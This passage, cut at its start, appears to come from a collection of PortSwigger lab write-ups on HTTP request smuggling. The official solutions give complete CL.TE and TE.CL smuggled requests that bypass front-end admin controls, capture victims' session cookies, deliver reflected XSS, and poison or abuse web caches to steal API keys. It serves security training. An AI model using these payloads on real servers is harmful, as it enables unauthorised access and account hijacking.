   Transfer-Encoding: chunked
   0
   GET /admin HTTP/1.1
   Host: localhost
   X-Ignore: X`
5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 116
   Transfer-Encoding: chunked
   0
   GET /admin HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10
   x=`
7. Observe that you can now access the admin panel.
8. Using the previous response as a reference, change the smuggled request URL to delete `carlos`:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 139
   Transfer-Encoding: chunked
   0
   GET /admin/delete?username=carlos HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10
   x=`

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=L6GikFq4Xbc

##### Michael Sommer

https://www.youtube.com/watch?v=rmDrjNxPgrE

</details>


## 12. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

[Open the lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

1. Try to visit `/admin` and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-length: 4
   Transfer-Encoding: chunked
   60
   POST /admin HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15
   x=1
   0`

   #### Note

   You need to include the trailing sequence `\r\n\r\n` following the final `0`.
4. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
5. Issue the following request twice:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked
   71
   POST /admin HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15
   x=1
   0`
6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete `carlos`:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-length: 4
   Transfer-Encoding: chunked
   87
   GET /admin/delete?username=carlos HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15
   x=1
   0`

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=XvqAbDo5DI0

##### Michael Sommer

https://www.youtube.com/watch?v=iILO_rRrHIo

</details>


## 13. Exploiting HTTP request smuggling to capture other users' requests

[Open the lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

#### Notes

- Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.
- The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Hint</summary>

If you encounter a timeout, this may indicate that the number of bytes you're trying to capture is greater than the total number of bytes in the subsequent request. Try reducing the `Content-Length` specified in the smuggled request prefix.

</details>

<details><summary>Official solution</summary>

1. Visit a blog post and post a comment.
2. Send the `comment-post` request to Burp Repeater, shuffle the body parameters so the `comment` parameter occurs last, and make sure it still works.
3. Increase the `comment-post` request's `Content-Length` to 400, then smuggle it to the back-end server:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 256
   Transfer-Encoding: chunked
   0
   POST /post/comment HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 400
   Cookie: session=your-session-token
   csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test`
4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
5. Copy the user's Cookie header from the comment, and use it to access their account.

#### Note

If the stored request is incomplete and doesn't include the Cookie header, you will need to slowly increase the value of the Content-Length header in the smuggled request, until the whole cookie is captured.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=lXtZU7AGtus

##### Michael Sommer

https://www.youtube.com/watch?v=v0jWcPEjNXI

</details>


## 14. Exploiting HTTP request smuggling to deliver reflected XSS

[Open the lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the `User-Agent` header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`.

#### Notes

- Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.
- The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

1. Visit a blog post, and send the request to Burp Repeater.
2. Observe that the comment form contains your `User-Agent` header in a hidden input.
3. Inject an XSS payload into the `User-Agent` header and observe that it gets reflected:

   `"/><script>alert(1)</script>`
4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 150
   Transfer-Encoding: chunked
   0
   GET /post?postId=5 HTTP/1.1
   User-Agent: a"/><script>alert(1)</script>
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 5
   x=1`

#### Note

Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=nNSf8PrxwW4

##### Michael Sommer

https://www.youtube.com/watch?v=jSg9-SXNiNY

</details>


## 15. Exploiting HTTP request smuggling to perform web cache deception

[Open the lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception)

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.

To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.

You can log in to your own account using the following credentials: `wiener:peter`

#### Notes

- Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.
- The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

1. Log in to your account and access the user account page.
2. Observe that the response doesn't have any anti-caching headers.
3. Smuggle a request to fetch the API key:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 42
   Transfer-Encoding: chunked
   0
   GET /my-account HTTP/1.1
   X-Ignore: X`
4. Repeat this request a few times, then load the home page in an incognito browser window.
5. Use the Search function on the Burp menu to see if the phrase "Your API Key" has appeared in any static resources. If it hasn't, repeat the POST requests, force-reload the browser window, and re-run the search.
6. Submit the victim's API key as the lab solution.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=7FjXYd4T1oM

##### Michael Sommer

https://www.youtube.com/watch?v=SnURKd84XG4

</details>


## 16. Exploiting HTTP request smuggling to perform web cache poisoning

[Open the lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert `document.cookie`.

#### Notes

- Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.
- The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

1. Open a blog post, click "Next post", and try smuggling the resulting request with a different Host header:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 129
   Transfer-Encoding: chunked
   0
   GET /post/next?postId=3 HTTP/1.1
   Host: anything
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10
   x=1`
2. Observe that you can use this request to make the next request to the website get redirected to `/post` on a host of your choice.
3. Go to your exploit server, and create a `text/javascript` file at `/post` with the contents:

   `alert(document.cookie)`
4. Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 193
   Transfer-Encoding: chunked
   0
   GET /post/next?postId=3 HTTP/1.1
   Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10
   x=1`
5. Then fetch `/resources/js/tracking.js` by sending the following request:

   `GET /resources/js/tracking.js HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Connection: close`

   If the attack has succeeded, the response to the `tracking.js` request should be a redirect to your exploit server.
6. Confirm that the cache has been poisoned by repeating the request to `tracking.js` several times and confirming that you receive the redirect every time.

#### Note

You may need to repeat the POST/GET process several times before the attack succeeds.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=yeWAViajjHw

##### Michael Sommer

https://www.youtube.com/watch?v=w3oep2YR4oI

</details>


## 17. Exploiting HTTP request smuggling to reveal front-end request rewriting

[Open the lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at `/admin`, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user `carlos`.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

1. Browse to `/admin` and observe that the admin panel can only be loaded from `127.0.0.1`.
2. Use the site's search function and observe that it reflects the value of the `search` parameter.
3. Use Burp Repeater to issue the following request twice.

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 124
   Transfer-Encoding: chunked
   0
   POST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 200
   Connection: close
   search=test`
4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
5. Make a note of the name of the `X-*-IP` header in the rewritten request, and use it to access the admin panel:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 143
   Transfer-Encoding: chunked
   0
   GET /admin HTTP/1.1
   X-abcdef-Ip: 127.0.0.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10
   Connection: close
   x=1`
6. Using the previous response as a reference, change the smuggled request URL to delete the user `carlos`:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 166
   Transfer-Encoding: chunked
   0
   GET /admin/delete?username=carlos HTTP/1.1
   X-abcdef-Ip: 127.0.0.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10
   Connection: close
   x=1`

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=Lp3dD_xWK9E

</details>


## 18. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

[Open the lab](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

Using Burp Repeater, issue the following request twice:

`POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked
0
GET /404 HTTP/1.1
X-Ignore: X`

The second request should receive an HTTP 404 response.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=WB_E6EybP_o

##### Michael Sommer

https://www.youtube.com/watch?v=V-2JTHKrO60

</details>


## 19. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

[Open the lab](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:

`POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0`

The second request should receive an HTTP 404 response.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=QaouEvhHefk

##### Michael Sommer

https://www.youtube.com/watch?v=C61YfdJp9do

</details>


## 20. HTTP request smuggling, basic CL.TE vulnerability

[Open the lab](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

Using Burp Repeater, issue the following request twice:

`POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
0
G`

The second response should say: `Unrecognized method GPOST`.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=4S5fkKJ4SM4

##### Michael Sommer

https://www.youtube.com/watch?v=xOk89Dz_yBk

</details>


## 21. HTTP request smuggling, basic TE.CL vulnerability

[Open the lab](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:

`POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0`

#### Note

You need to include the trailing sequence `\r\n\r\n` following the final `0`.

The second response should say: `Unrecognized method GPOST`.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=kIRIV-BwBTE

##### Michael Sommer

https://www.youtube.com/watch?v=B1c0E1gK-Qk

</details>


## 22. HTTP request smuggling, obfuscating the TE header

[Open the lab](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)

This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:

`POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow
5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0`

#### Note

You need to include the trailing sequence `\r\n\r\n` following the final `0`.

The second response should say: `Unrecognized method GPOST`.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=TUsc14YH6LE

##### Michael Sommer

https://www.youtube.com/watch?v=4KhyRDhcIzc

</details>

